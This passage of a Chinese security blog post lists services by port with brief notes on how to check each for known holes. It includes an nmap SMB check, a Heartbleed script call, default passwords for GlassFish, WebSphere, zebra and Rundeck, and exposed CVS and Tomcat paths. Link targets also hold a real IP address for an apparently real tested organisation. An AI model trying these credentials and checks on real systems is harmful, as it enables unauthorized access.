+<p>Windows Server<br>服务RPC请求缓冲区溢出漏洞，如果用户在受影响的系统上收到特制的RPC请求，则该漏洞可能允许远程执行代码。在Microsoft<br>Windows 2000 、Windows XP 、Windows<br>Server2003系统上，攻击者可能未经身份即可利用此漏洞运行代码，此漏洞可以形成蠕虫攻击。</p>
+<p>Nmap 可以检测目标上是否存在该漏洞：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namp –sS –A –script=smb-check-vulns –PO zz<span class="selector-class">.zz</span><span class="selector-class">.zz</span><span class="selector-class">.zz</span></span><br><span class="line"></span><br><span class="line">nmap -sS -A --script=smb-check-vulns -PO zz<span class="selector-class">.zz</span><span class="selector-class">.zz</span>.zz</span><br></pre></td></tr></table></figure>
+<p>…….</p>
+<h1 id="35-openssl心脏出血"><a href="#35-openssl心脏出血" class="headerlink" title="35 openssl心脏出血 "></a>35 openssl心脏出血 </h1><p>Port：443</p>
+<p>Kali桌面以保存python验证脚本</p>
+<p>root@Aerfa:~/Desktop# python openssl.py zz.zz.zz.zz</p>
+<h1 id="36-squid代理默认端口"><a href="#36-squid代理默认端口" class="headerlink" title="36 squid代理默认端口 "></a>36 squid代理默认端口 </h1><p>Port: 3128</p>
+<p>若没有设置口令，则很可能直接漫游内网。</p>
+<h1 id="37-GlassFish-web中间件弱口令"><a href="#37-GlassFish-web中间件弱口令" class="headerlink" title="37 GlassFish web中间件弱口令 "></a>37 GlassFish web中间件弱口令 </h1><p>Port: 4848</p>
+<p>弱口令：admin / adminadmin</p>
+<h1 id="38-PHP-FastCGI远程利用"><a href="#38-PHP-FastCGI远程利用" class="headerlink" title="38 PHP FastCGI远程利用 "></a>38 PHP FastCGI远程利用 </h1><p>Port：9000</p>
+<p>zone.wooyun.org/content/1060</p>
+<p>使用nmap进行指纹识别： <code>nmap –sV –p 9000 –open zz.zz.zz.zz/24</code></p>
+<p>目前遇到poc执行出现问题：invalid header<br>version</p>
+<p>（windows 7下未安装goland，<br>kali中已安装仍然出现该问题）</p>
+<h1 id="39-elasticsearch代码执行"><a href="#39-elasticsearch代码执行" class="headerlink" title="39 elasticsearch代码执行 "></a>39 elasticsearch代码执行 </h1><p>Port: 9200</p>
+<h1 id="40-websphere-web中间件弱口令"><a href="#40-websphere-web中间件弱口令" class="headerlink" title="40 websphere web中间件弱口令 "></a>40 websphere web中间件弱口令 </h1><p>Port: 9043</p>
+<p>弱口令：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">admin</span> / <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line">websphere / websphere</span><br><span class="line"></span><br><span class="line"><span class="keyword">system</span> / manager</span><br></pre></td></tr></table></figure>
+
+<h1 id="41-zebra路由弱密码"><a href="#41-zebra路由弱密码" class="headerlink" title="41 zebra路由弱密码 "></a>41 zebra路由弱密码 </h1><p>Port: 2601,2604</p>
+<p>zebra / zebra</p>
+<h1 id="42-rundeck-web"><a href="#42-rundeck-web" class="headerlink" title="42 rundeck web "></a>42 rundeck web </h1><p>Port：4440 wooyun-2015-092026</p>
+<p>runDeck是用Java/Grails写的开源工具，帮助用户在数据中心或者云环境中自动化各种操作和流程。通过命令行或web界面，用户可以对任意数量的服务器进行操作，大大降低了对服务器自动化的门槛。</p>
+<p><a target="_blank" rel="noopener" href="http://ip:4440/">http://IP:4440</a> admin / admin</p>
+<p><a target="_blank" rel="noopener" href="http://ip:4440/menu/home">http://IP:4440/menu/home</a></p>
+<h1 id="43-dns未设置spf导致邮箱欺骗漏洞"><a href="#43-dns未设置spf导致邮箱欺骗漏洞" class="headerlink" title="43 dns未设置spf导致邮箱欺骗漏洞 "></a>43 dns未设置spf导致邮箱欺骗漏洞 </h1><p>nslookup –qt=mx baidu.com</p>
+<p>nslookup –qt=txt baidu.com</p>
+<h1 id="44-CVS源码泄露"><a href="#44-CVS源码泄露" class="headerlink" title="44 CVS源码泄露 "></a>44 CVS源码泄露 </h1><h2 id="44-1-基础知识"><a href="#44-1-基础知识" class="headerlink" title="44.1 基础知识 "></a>44.1 基础知识 </h2><p>略</p>
+<h2 id="44-2-实例应用"><a href="#44-2-实例应用" class="headerlink" title="44.2 实例应用 "></a>44.2 实例应用 </h2><p>zz集团</p>
+<p><a target="_blank" rel="noopener" href="http://61.152.242.65/bs3q/CVS/Root">http://yy.yy.yy.yy/bs3q/CVS/Root</a></p>
+<p><a target="_blank" rel="noopener" href="http://61.152.242.65/cmbs/CVS/Root">http://yy.yy.yy.yy/cmbs/CVS/Root</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_9f3274155b1132f6.png"></p>
+<p><a target="_blank" rel="noopener" href="http://61.152.242.65/cmbs/CVS/Entries">http://yy.yy.yy.yy/cmbs/CVS/Entries</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_41469a6a25a8a31a.png"></p>
+<h1 id="45-Tomcat-examples-directory漏洞"><a href="#45-Tomcat-examples-directory漏洞" class="headerlink" title="45 Tomcat examples directory漏洞 "></a>45 Tomcat examples directory漏洞 </h1><p><a target="_blank" rel="noopener" href="http://61.152.242.65/examples/servlets/servlet/SessionExample">http://yy.yy.yy.yy/examples/servlets/servlet/SessionExample</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_3a3e383932a1596a.png"></p>
+<p>是否存在sql post注入<br>、session伪造等安全问题。</p>
+-->
+      
+
+    </div>
+
+
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+
+    <footer class="article-footer">
+      
+        <a data-url="http://www.pa55w0rd.online/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E9%82%A3%E4%BA%9B%E6%B4%9E/" data-id="ckrojfgfc00axdsswbmacgs3i" class="article-share-link" data-share="baidu" data-title="安全运维那些洞-Aerfa">分享到</a>
+      
+
+      
+        <a href="http://www.pa55w0rd.online/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E9%82%A3%E4%BA%9B%E6%B4%9E/#gitalk-container" class="article-comment-link">留言</a>
+      
+
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/" rel="tag">安全运维</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">← 上一篇</strong>
+      <div class="article-nav-title">Web应用安全测试备忘录 By legend</div>
+    </a>
+  
+  
+    <a href="/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD%E8%AF%84%E4%BC%B0%E4%B8%9A%E5%8A%A1%E6%BD%9C%E5%9C%A8%E9%A3%8E%E9%99%A9%E7%9A%84%E6%80%9D%E8%B7%AF/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇 →</strong>
+      <div class="article-nav-title">
+        
+          企业安全建设中评估业务潜在风险的思路（转发）
+        
+      </div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+<!--
+<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+-->
+
+
+  <section class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section> 
+
+
+
+
+  <script type="text/javascript">document.write(unescape("%3Cdiv id='reward' %3E%3C/div%3E%3Cscript src='/js/reward.min.js' type='text/javascript'%3E%3C/script%3E"));</script>
+  <div id="gitalk-container"></div>
+
+
+</section>
+      
+      <aside   id="sidebar">
+  
+    
+  <div class="widget-wrap">
+
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-file-text-o"></i>近期文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/oss/">阿里云OSS Bucket 劫持</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/awvs-vul/">AWVS漏洞复现小记</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/iast/">洞态IAST落地实践</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/netsparker-iast/">Netsparker扫描器IAST使用</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/awvs-iast/">AWVS扫描器IAST使用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-tasks"></i>分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">43</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">安全建设</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/">开发安全</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a><span class="category-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+  <script>
+  $(document).on("click", "ul.category-list li.category-list-item", function () {
+    window.location.href = $(this).find('a').attr('href')
+  })
+  </script>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-cloud"></i>标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 11.43px;">Android</a> <a href="/tags/Android-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">Android - 安全测试 - 工具使用</a> <a href="/tags/DevSecOps/" style="font-size: 10px;">DevSecOps</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/SDL/" style="font-size: 17.14px;">SDL</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 11.43px;">checklist</a> <a href="/tags/docker/" style="font-size: 11.43px;">docker</a> <a href="/tags/hexo/" style="font-size: 12.86px;">hexo</a> <a href="/tags/iso27001/" style="font-size: 10px;">iso27001</a> <a href="/tags/jsonp%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">jsonp劫持</a> <a href="/tags/linux/" style="font-size: 11.43px;">linux</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/note/" style="font-size: 20px;">note</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 12.86px;">web安全</a> <a href="/tags/windows-%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/" style="font-size: 10px;">业务安全</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">代码扫描</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="font-size: 10px;">内网安全</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%88%86%E6%9E%90/" style="font-size: 10px;">分析</a> <a href="/tags/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" style="font-size: 10px;">前端加密</a> <a href="/tags/%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/" style="font-size: 10px;">名词解释</a> <a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 11.43px;">基础</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 14.29px;">基础知识</a> <a href="/tags/%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/" style="font-size: 10px;">基线加固</a> <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" style="font-size: 10px;">备忘录</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" style="font-size: 18.57px;">安全建设</a> <a href="/tags/%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/" style="font-size: 10px;">安全架构</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%92/" style="font-size: 10px;">安全规划</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83/" style="font-size: 12.86px;">安全规范</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/" style="font-size: 15.71px;">安全设计</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1%E8%AF%84%E5%AE%A1/" style="font-size: 10px;">安全设计评审</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/" style="font-size: 10px;">安全评估</a> <a href="/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/" style="font-size: 10px;">安全运维</a> <a href="/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/" style="font-size: 12.86px;">安全防护</a> <a href="/tags/%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/" style="font-size: 11.43px;">安装使用</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 18.57px;">工具使用</a> <a href="/tags/%E5%B9%B3%E5%8F%B0%E5%BB%BA%E8%AE%BE/" style="font-size: 11.43px;">平台建设</a> <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 12.86px;">应急响应</a> <a href="/tags/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/" style="font-size: 14.29px;">开发安全</a> <a href="/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">开源工具</a> <a href="/tags/%E6%8A%80%E5%B7%A7/" style="font-size: 11.43px;">技巧</a> <a href="/tags/%E6%8C%87%E5%8D%97/" style="font-size: 10px;">指南</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">操作记录</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/" style="font-size: 10px;">数据安全</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" style="font-size: 10px;">未授权访问</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 12.86px;">漏洞利用</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86/" style="font-size: 10px;">漏洞管理</a> <a href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" style="font-size: 10px;">移动安全</a> <a href="/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/" style="font-size: 10px;">等级保护</a> <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">编程基础</a> <a href="/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" style="font-size: 18.57px;">解决方法</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">资产扫描</a> <a href="/tags/%E8%BF%81%E7%A7%BB/" style="font-size: 10px;">迁移</a> <a href="/tags/%E9%80%9F%E6%9F%A5%E8%A1%A8/" style="font-size: 10px;">速查表</a> <a href="/tags/%E9%9D%9Eweb%E5%9E%8Bxss/" style="font-size: 10px;">非web型xss</a> <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8/" style="font-size: 10px;">验证码安全</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-archive"></i>归档</h3>
+    <div class="widget">
+      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">15</span></li></ul> -->
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">2021年07月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">2021年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">2021年05月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">2019年11月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">2019年10月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">2019年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">2019年08月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">2019年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">2019年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">2019年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">2019年04月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">2019年03月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">2019年01月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">15</span></li></ul>
+    </div>
+  </div>
+
+
+<script>
+$(document).on("click", "ul.archive-list li.archive-list-item", function () {
+  window.location.href = $(this).find('a').attr('href')
+})
+</script>
+
+  
+    
+  <style>
+  *{ margin: 0; padding: 0;}
+  .tooltips{ border-width: 1px; border-style: solid; position: absolute; display: none; border-radius: 3px; opacity: 0; filter:alpha( opacity = 0) ; z-index: 999;}
+  .tooltips p.content{ padding: 5px; }
+  .tooltips .triangle-front,.tooltips .triangle-back{ width: 0; height: 0; overflow: hidden; border-width: 8px; border-style: solid; position: absolute; border-color: transparent ; top: 100%; left: 50%; margin-left: -8px;}
+  .tooltips .triangle-back{ margin-top: -1px;}
+
+  .toolTipInfo{ border-color: #000; background-color: #EEEEEE;}
+  .toolTipInfo .triangle-front{ border-top-color: #EEEEEE;}
+  .toolTipInfo .triangle-back{ border-top-color: #EEEEEE;}
+
+
+  .icoSize{font-size: 2em}
+  </style>
+
+
+
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-link"></i>链接</h3>
+    <div class="widget" style="z-index: 1;">
+
+
+
+
+
+      <!-- <ul> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+                  <a id="github-alt-icon-color" class="weight-icon-link" target="_blank"  href="https://github.com/Pa55w0rd">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-github-alt fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+            <a id="weixin-icon-color" class="weight-icon-link"  href="javascript:;"   id="weixin-icon" target="_blank" tooltips="<img src='/img/weixin.png'>">
+                <span class="fa-stack fa-lg">
+                      <i class="fa fa-circle fa-stack-2x"></i>
+                      <i class="fa fa-weixin  fa-stack-1x fa-inverse"></i>
+                  </span>
+              </a>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+            <a id="qq-icon-color" class="weight-icon-link"  href="javascript:;"   id="qq-icon" target="_blank" tooltips="<img src='/img/qq.png'>">
+                <span class="fa-stack fa-lg">
+                      <i class="fa fa-circle fa-stack-2x"></i>
+                      <i class="fa fa-qq  fa-stack-1x fa-inverse"></i>
+                  </span>
+              </a>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+                  <a id="envelope-o-icon-color" class="weight-icon-link" target="_blank"  href="mailto:pa55w0rd@aliyun.com" data-toggle="tooltip" data-placement="top" title="请多多交流！">
+                  <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-envelope-o  fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+          
+
+          
+
+
+          <!-- </li> -->
+        
+      <!-- </ul> -->
+    </div>
+  </div>
+
+
+  <script>
+  $.fn.extend({
+    hoverTips : function (){
+      var self = $(this);
+      var sw = self.get(0).switch;
+      if( !sw ) {
+        sw = true;
+        var content = self.attr("tooltips");
+        var htmlDom = $("<div class='tooltips'>")
+            .addClass("toolTipInfo")
+            .html("<p class='content'></p>"
+                + "<p class='triangle-front'></p>"
+                + "<p class='triangle-back'></p>");
+        htmlDom.find("p.content").html( content );
+      }
+      self.on("mouseover",function(){
+        $("body").append( htmlDom );
+        var left = self.offset().left - htmlDom.outerWidth()/2 + self.outerWidth()/2;
+        var top = self.offset().top - htmlDom.outerHeight() - parseInt(htmlDom.find(".triangle-front").css("border-width"));
+        htmlDom.css({"left":left,"top":top - 10,"display":"block"});
+        htmlDom.stop().animate({ "top" : top ,"opacity" : 1},300);
+      });
+      self.on("mouseout",function(){
+        var top = parseInt(htmlDom.css("top"));
+        htmlDom.stop().animate({ "top" : top - 10 ,"opacity" : 0},300,function(){
+          htmlDom.remove();
+          sw = false;
+        });
+      });
+    },
+
+  });
+
+  $("#weixin-icon-color").hoverTips();
+  $("#qq-icon-color").hoverTips();
+  </script>
+
+
+
+  
+    
+    <div class="widget-wrap">
+  
+      <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-group"></i>友情链接『不分先后』</h3>
+      <div class="widget">
+        <ul>
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="https://firexun.github.io"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>青衫磊落</a>
+            </li>
+
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="http://www.weiho.xyz"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>Weiho</a>
+            </li>
+
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="http://pirogue.org"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>pirogue</a>
+            </li>
+
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="http://www.mianhuage.com"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>Cotton&#39;s Blog</a>
+            </li>
+
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="https://www.lovesec.com"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>超级菜鸟</a>
+            </li>
+
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="https://my.oschina.net/9199771"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>超级大熊猫</a>
+            </li>
+
+        
+        </ul>
+      </div>
+    </div>
+  
+  
+  
+</aside>
+
+      
+    </div>
+    <footer  id="footer">
+  
+  <div  data-scroll-reveal="enter bottom"  class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Pa55w0rd<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      .
+      Theme by <a href="https://github.com/HipHopCoderS/Landscape-x" target="_blank">Landscape-x</a>
+    </div>
+
+    <div id="footer-info" class="inner">
+      <!-- id 将作为查询条件 
+      <span id="<Your/Path/Name>" class="leancloud-visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">阅读量 </em>
+        <i class="leancloud-visitors-count">1000000</i>
+      </span>
+-->
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      <div class="powered-by">
